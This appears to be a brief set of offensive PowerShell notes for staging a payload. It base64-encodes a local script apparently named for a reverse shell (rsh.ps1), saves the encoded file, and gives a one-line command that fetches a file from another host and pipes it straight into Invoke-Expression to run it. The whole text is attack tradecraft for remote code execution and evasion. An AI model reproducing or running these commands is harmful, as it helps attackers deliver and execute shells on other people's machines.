# B64 encoding:
$Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes([System.IO.File]::ReadAllText("C:\Users\rsh.ps1")))
Write-Output $Base64 |  Out-File -FilePath "C:\Users\rsh.b64"

# Then host the b64 file and iwr (Invoke-WebRequest) or wget it (shortest way):
powershell "wget 192.168.1.1/f|iex"